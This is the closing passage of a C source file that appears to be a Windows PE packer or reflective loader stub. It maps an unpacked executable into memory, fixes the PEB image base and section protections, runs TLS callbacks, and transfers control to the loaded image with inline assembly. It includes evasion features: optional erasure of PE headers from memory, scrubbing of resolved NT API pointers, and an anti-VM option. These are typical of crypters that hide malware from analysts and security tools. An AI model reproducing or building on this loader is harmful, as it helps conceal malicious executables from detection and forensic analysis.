        NT_EXIT(STATUS_UNHANDLED_EXCEPTION);

    InitImageSecurityCookie(img, hdOpt);


    /* Update PEB with new image base */
    peb->ImageBaseAddress = img;



#if (USING_ERASE_PE_HEADERS)
{//* ERASE PE HEADERS
    PIMAGE_NT_HEADERS64 _nt =
        RVA(PIMAGE_NT_HEADERS64, img, DOS_LFANEW(img));

    ZEROS(img, _nt->OptionalHeader.SizeOfHeaders);
}//* ERASE PE HEADERS
#endif



    IF_UNLIKE (!SetImageSectionsPermission(img, hdNt))
        NT_EXIT(STATUS_SECTION_PROTECTION);


    /* Calculate entry point virtual address */
    AddrOfEntryPoint = RVA(ULONGLONG, img, hdOpt->AddressOfEntryPoint);


    ExecuteImageTLS(img, hdOpt);



    /* Release unpacked image buffer */
    FreeBuf(&buf);


    /* Scrub resolved function pointers from memory */

    pNtClose                   = NULL;

    pNtAllocateVirtualMemory   = NULL;
    pNtProtectVirtualMemory    = NULL;
    pNtFreeVirtualMemory       = NULL;

#if (USING_ANTI_VM)
    pNtOpenKey                 = NULL;
    pNtEnumerateKey            = NULL;
#endif

    pNtOpenFile                = NULL;
    pNtReadFile                = NULL;
    pNtQueryInformationFile    = NULL;

    pNtQueryInformationProcess = NULL;

    pLdrLoadDll                = NULL;
    pLdrGetProcedureAddress    = NULL;
    pRtlAddFunctionTable       = NULL;



    /* Call DllMain for DLL images */
    IF_UNLIKE (IS_DLL_IMAGE) NT_EXIT((

        ((DllMain_t)AddrOfEntryPoint)(
            (HINSTANCE)img, DLL_PROCESS_ATTACH, NULL)

    )? STATUS_SUCCESS : STATUS_DLL_INIT_FAILED);



    pNtTerminateProcess = NULL;
}//* MAIN

    /* Transfer control to the loaded executable */
    __asm__ volatile (
        "andq $-16, %%rsp\n\t" // Align stack to 16-byte boundary
        "subq $40,  %%rsp\n\t" // Reserve 32-byte shadow space + 8 for alignment

        "movq %0, %%rax\n\t"   // Move entry point address

        "xorl %%ebp, %%ebp\n\t"
        "xorl %%ebx, %%ebx\n\t"

        "jmpq *%%rax\n\t"      // Jump to the loaded image entry point


        : : "r"(AddrOfEntryPoint)
        : "memory", "rax"
    );



_exit:
    IF_LIKE (pNtTerminateProcess)
        pNtTerminateProcess(NT_CUR_PROCESS, _NtStatusExit);

    return _NtStatusExit;
}
